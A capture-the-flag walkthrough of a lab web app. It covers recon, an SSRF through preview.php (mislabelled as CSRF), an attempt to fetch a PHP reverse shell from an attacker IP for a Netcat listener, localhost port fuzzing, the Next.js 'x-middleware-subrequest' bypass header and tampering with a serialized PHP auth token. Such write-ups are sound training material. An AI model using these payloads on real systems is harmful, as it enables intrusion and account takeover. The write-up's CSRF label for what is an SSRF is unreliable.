# Extract CTF 

The librarian rushed some final changes to the web application before heading off on holiday. In the process, they accidentally left sensitive information behind! Your challenge is to find and exploit the vulnerabilities in the application to extract these secrets.

###### Nmap 

`nmap -sCV -O -T4 trybookme.thm`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9e:1a:9e:38:50:f9:88:c4:b1:bd:28:5d:b9:4a:f6:aa (ECDSA)
|_  256 04:fa:e2:a7:96:4f:cb:72:e4:09:76:e6:5f:86:1b:63 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: TryBookMe - Online Library
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

###### Brute-forcing directories with gobuster 
`gobuster dir -w /usr/share/wordlists/dirb/common.txt -url http://trybookme.thm`

```
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 1735]
/javascript           (Status: 301) [Size: 319] [--> http://trybookme.thm/javascript/]
/management           (Status: 301) [Size: 319] [--> http://trybookme.thm/management/]
/pdf                  (Status: 301) [Size: 312] [--> http://trybookme.thm/pdf/]
/server-status        (Status: 403) [Size: 278]
Progress: 4613 / 4613 (100.00%)
```
###### Source Code Review 
```
     <ul class="list-group pdf-list">
          <li class='list-group-item'><a onclick="openPdf('http://cvssm1/pdf/dummy.pdf')">Dummy</a></li><li class='list-group-item'><a onclick="openPdf('http://cvssm1/pdf/lorem.pdf')">Lorem</a></li>        </ul>
      </div>

     <script>
    function openPdf(url) {
      const iframe = document.getElementById('pdfFrame');
      iframe.src = 'preview.php?url=' + encodeURIComponent(url);
      iframe.style.display = 'block';
    }
    </script>
```

Looking at the source code, the web application involves a feature where in the event of a user clicking on the "Dummy" and "Lorem" items, it loads a pdf using the function openPdf which uses a php file that includes the encoded URI of the pdf. 

Taking a look at my outgoing request to the website, there's no CSRF token present. Let's see if we can get exploit a CSRF vulnerability. 

Using burp suite to intercept the request, we can see that the encoded URI component is simply using URL special characters encoding.
Perhaps, we can encode the URI including the attacker IP to get the server to fetch the php reverse shell hosted via a Python web server and listen for reverse connections with Netcat. 
`http://<attacker_ip>/reverse_shell.php` => `http%3A%2F%2F192.168.132.123%2Freverse_shell.php`

That did not work, but let's try exploiting the CSRF to load a restricted endpoint, i.e. /management.
`http://trybookme.thm/preview.php?url=http://127.0.0.1/management`

It worked! 

###### Port Fuzzing

`ffuf  -u 'http://trybookme.thm/preview.php?url=http://127.0.0.1/FUZZ/' -w <(seq 1 65535) -mc all -t 100 -fs 0`
> `http://trybookme.thm/preview.php?url=http://127.0.0.1:10000/`

###### NextJS Middleware Exploit

> Middleware enables code execution during runtime before completion of a request => the response can be modified based on the incoming request by redirecting or altering the request or response headers, or by directly responding.
> From Next.js documentation

Thanks to Zhero or Rachid.A for this exploit. To summarize his explanation:

- In the event that a next.js application uses middleware, the app uses a runMiddleware function that retrieves the `x-middleware-subrequest` header to create a colon-separated list containing the header value in order to check if it contains the value for `middlewareInfo.name`
- Knowing that the header value contains `middlewareInfo.name`, documentation for prior versions of Next.js indicates that the file was named `_middleware.ts` which was placed in the `pages` folder in versions 12 or earlier, as the `pages` router was the only router that existed. 

- In versions greater than 12.2, it is important to consider the following: (1) the underscore was removed from the filename convention; (2) the file is no longer found in the `pages` folder; and (3) an alternative to the pages directory is the src directory. 
- Lastly, a max recursion feature was added, including two variables: `depth` and `MAX_RECURSION_DEPTH`, where `depth` must be greater or equal than `MAX_RECURSION_DEPTH`. Everytime the colon is separated, the constant `depth` increments by 1. 

Finally, we can bypass the middleware with the following: `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`. 
By including this header as part of the encoded URI in our request, we can access the customapi endpoint and retrieve the first flag by requesting to access the endpoint, intercepting the request, and running the html code on our own machine. 

###### Logging into Management 

We send a URL encoded POST request to the /management endpoint with the credentials found from the HTML api page created earlier. Upon sending this post request, we can see that there are 2 set cookies with a PHPSESSID value and an `auth_token` value, landing at /2fa.php. When `auth_token` is decoded, the token is `O:9:"AuthToken":1:{s:9:"validated";b:0;};`. This is an insecure deserialization vulnerability where an attacker is able to convert encoded text such as tokens to human-readable text and change the values within the text, i.e. validated;b:0 => validated;b:1. 

With our CSRF exploit, by including these cookies in the URL parameter attached to a GET request to /preview.php on Burp Suite, we can get the second flag located at /2fa.php.
